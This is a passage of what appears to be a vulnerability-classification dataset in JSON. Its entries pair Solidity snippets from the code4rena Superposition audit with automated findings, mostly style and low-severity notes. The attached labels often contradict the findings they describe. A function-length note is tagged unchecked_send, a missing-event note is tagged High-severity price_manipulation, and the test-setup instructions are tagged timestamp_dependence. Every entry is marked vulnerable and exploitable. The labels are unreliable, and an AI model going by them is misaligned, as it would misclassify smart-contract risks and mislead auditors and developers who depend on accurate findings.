    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n59:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n181:     function enablePool579DA658(address /* pool */, bool /* enabled */) external {\n\n186:     function authoriseEnabler5B17C274(address /* enabler */, bool /* enabled */) external {\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n228:     function quote2CD06B86E(address /* from */, address /* to */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n270:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n307:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n353:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n359:     function transferPositionEEC7A3CD(uint256 /* id */, address /* from */, address /* to */) external {\n\n364:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n369:     function positionLiquidity8D11C045(address /* pool */, uint256 /* id */) external returns (uint128) {\n\n374:     function positionTickLower2F77CCE1(address /* pool */, uint256 /* id */) external returns (int32) {\n\n379:     function positionTickUpper67FD55BA(address /* pool */, uint256 /* id */) external returns (int32) {\n\n384:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n\n394:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n399:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n512:     function _getExecutorSwap() internal view returns (address) {\n\n515:     function _getExecutorSwapPermit2A() internal view returns (address) {\n\n518:     function _getExecutorQuote() internal view returns (address) {\n\n521:     function _getExecutorPosition() internal view returns (address) {\n\n524:     function _getExecutorUpdatePosition() internal view returns (address) {\n\n527:     function _getExecutorAdmin() internal view returns (address) {\n\n530:     function _getExecutorAdjustPosition() internal view returns (address) {\n\n533:     function _getExecutorSwapPermit2B() internal view returns (address) {\n\n536:     function _getExecutorFallback() internal view returns (address) {\n\n540:     function _setProxyAdmin(address newAdmin) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-8\"></a>[NC-8] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (54)*: File: ./pkg/sol/OwnershipNFTs.sol 47:     function ownerOf(uint256 _tokenId) public view returns (address) { 57:     function getApproved(uint256 _tokenId) external view returns (address) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 88,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n436:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n436:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_SLOT).value = a;\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_SLOT).value = a;\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_A_SLOT).value = a;\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_A_SLOT).value = a;\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_QUOTE_SLOT).value = a;\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_QUOTE_SLOT).value = a;\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_POSITION_SLOT).value = a;\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_POSITION_SLOT).value = a;\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_UPDATE_POSITION_SLOT).value = a;\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_UPDATE_POSITION_SLOT).value = a;\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADMIN_SLOT).value = a;\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADMIN_SLOT).value = a;\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADJUST_POSITION_SLOT).value = a;\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADJUST_POSITION_SLOT).value = a;\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_B_SLOT).value = a;\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_B_SLOT).value = a;\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = a;\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = a;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "High",
    "title": "<a name=\"NC-10\"></a>[NC-10] Missing Event for critical parameters change",
    "description": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes. *Instances (28)*: File: ./pkg/sol/SeawaterAMM.sol 123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { _setProxyAdmin(newAdmin);",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 96,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n149:                 revert(0, returndatasize())\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"NC-14\"></a>[NC-14] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 149:                 revert(0, returndatasize()) [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/SeawaterAMM.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   StructDefinition.AddressSlot\n   FunctionDefinition.getAddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactInPermit254A7DBB1\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionE2437399\n   FunctionDefinition.setExecutorSwap\n   FunctionDefinition.setExecutorSwapPermit2A\n   FunctionDefinition.setExecutorQuote\n   FunctionDefinition.setExecutorPosition\n   FunctionDefinition.setExecutorUpdatePosition\n   FunctionDefinition.setExecutorAdmin\n   FunctionDefinition.setExecutorAdjustPosition\n   FunctionDefinition.setExecutorSwapPermit2B\n   FunctionDefinition.setExecutorFallback\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2A\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorAdjustPosition\n   FunctionDefinition._getExecutorSwapPermit2B\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n   \n   Suggested order:\n   StructDefinition.AddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.getAddressSlot\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactInPermit254A7DBB1\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionE2437399\n   FunctionDefinition.setExecutorSwap\n   FunctionDefinition.setExecutorSwapPermit2A\n   FunctionDefinition.setExecutorQuote\n   FunctionDefinition.setExecutorPosition\n   FunctionDefinition.setExecutorUpdatePosition\n   FunctionDefinition.setExecutorAdmin\n   FunctionDefinition.setExecutorAdjustPosition\n   FunctionDefinition.setExecutorSwapPermit2B\n   FunctionDefinition.setExecutorFallback\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2A\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorAdjustPosition\n   FunctionDefinition._getExecutorSwapPermit2B\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-15\"></a>[NC-15] Contract does not follow the Solidity style guide's suggested layout ordering",
    "description": "The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be: 1) Type declarations 2) State variables 3) Events 4) Modifiers",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 133,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n59:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n132:     function directDelegate(address to) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-16\"></a>[NC-16] Internal and private variables and functions names should begin with an underscore",
    "description": "According to the Solidity Style Guide, Non-`external` variable and function names should begin with an [underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables) *Instances (3)*: File: ./pkg/sol/OwnershipNFTs.sol 34:     mapping(uint256 => address) private getApproved_; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.194,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n36: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n97:         ISeawaterExecutorFallback _executorFallback\n\n109:             _executorFallback\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n481:         StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = a;\n\n485:     fallback() external {\n\n505:         else directDelegate(_getExecutorFallback());\n\n536:     function _getExecutorFallback() internal view returns (address) {\n\n537:         return StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value;\n\n553:         ISeawaterExecutorFallback executorFallback\n\n563:         StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = address(executorFallback);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] Fallback lacking `payable`",
    "description": "*Instances (11)*: File: ./pkg/sol/SeawaterAMM.sol 36: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1); 97:         ISeawaterExecutorFallback _executorFallback 109:             _executorFallback",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.796,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n155:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {\n             return TOKEN_URI;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] NFT ownership doesn't support hard forks",
    "description": "To ensure clarity regarding the ownership of the NFT on a specific chain, it is recommended to add `require(block.chainid == 1, \"Invalid Chain\")` or the desired chain ID in the functions below. Alternatively, consider including the chain ID in the URI itself. By doing so, any confusion regarding the chain responsible for owning the NFT will be eliminated. *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 155:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.167,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n[Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"L-3\"></a>[L-3] Solidity version 0.8.20+ may not work on other chains due to `PUSH0`",
    "description": "The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new `PUSH0` op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version). While the project itself may or may not compile with 0.8.20, other projects with which it integrates, or which extend this project may, and those projects will have problems deploying these contracts/libraries. *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 2: pragma solidity 0.8.16; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.108,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Fees can be set to be greater than 100%.",
    "description": "There should be an upper limit to reasonable fees. A malicious owner can keep the fee rate at zero, but if a large value transfer enters the mempool, the owner can jack the rate up to the maximum and sandwich attack a user. *Instances (8)*: File: ./pkg/sol/SeawaterAMM.sol 389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n160:     function createPoolD650E2D0(\n\n171:     function collectProtocol7540FA9F(\n\n181:     function enablePool579DA658(address /* pool */, bool /* enabled */) external {\n\n186:     function authoriseEnabler5B17C274(address /* enabler */, bool /* enabled */) external {\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n208:     function swap904369BE(\n\n218:     function quote72E2ADE7(\n\n228:     function quote2CD06B86E(address /* from */, address /* to */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n233:     function swapPermit2EE84AD91(\n\n247:     function swap2ExactInPermit254A7DBB1(\n\n260:     function swap2ExactIn41203F1D(\n\n270:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n283:     function swapInPermit2CEAAB576(\n\n307:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n319:     function swapOutPermit23273373B(\n\n344:     function mintPositionBC5B086D(\n\n353:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n359:     function transferPositionEEC7A3CD(uint256 /* id */, address /* from */, address /* to */) external {\n\n364:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n369:     function positionLiquidity8D11C045(address /* pool */, uint256 /* id */) external returns (uint128) {\n\n374:     function positionTickLower2F77CCE1(address /* pool */, uint256 /* id */) external returns (int32) {\n\n379:     function positionTickUpper67FD55BA(address /* pool */, uint256 /* id */) external returns (int32) {\n\n384:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n\n394:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n399:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n419:     function collectSingleTo6D76575F(\n\n428:     function collect7F21947C(\n\n436:     function updatePositionC7F1F740(\n\n445:     function incrPositionE2437399(\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n485:     fallback() external {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-2\"></a>[M-2] Library function isn't `internal` or `private`",
    "description": "In a library, using an external or public visibility means that we won't be going through the library with a DELEGATECALL but with a CALL. This changes the context and should be done carefully. *Instances (46)*: File: ./pkg/sol/SeawaterAMM.sol 123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { 160:     function createPoolD650E2D0(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 96,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2024-10-superposition/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ * It is possible for someone to grief the protocol by creating a pool with bad configuration. * It is possible for the permissioned account to do things to grief the protocol. * Operator makes a mistake with a trusted function",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash\nhttps://github.com/code-423n4/2024-10-superposition\ncd 2024-10-superposition/pkg\nrustup target add wasm32-unknown-unknown\ncargo install cargo-stylus\n./tests.sh # this would test the rust files from the files in ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Running tests",
    "description": "See [pkg/README](https://github.com/code-423n4/2024-10-superposition/blob/main/pkg/README.md#building) for a detailed explanation Then run the following command: https://github.com/code-423n4/2024-10-superposition cd 2024-10-superposition/pkg rustup target add wasm32-unknown-unknown",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.216,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "cargo test\n--features=testing,testing-dbg-erc20 -- --nocapture",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Cargo test tracing",
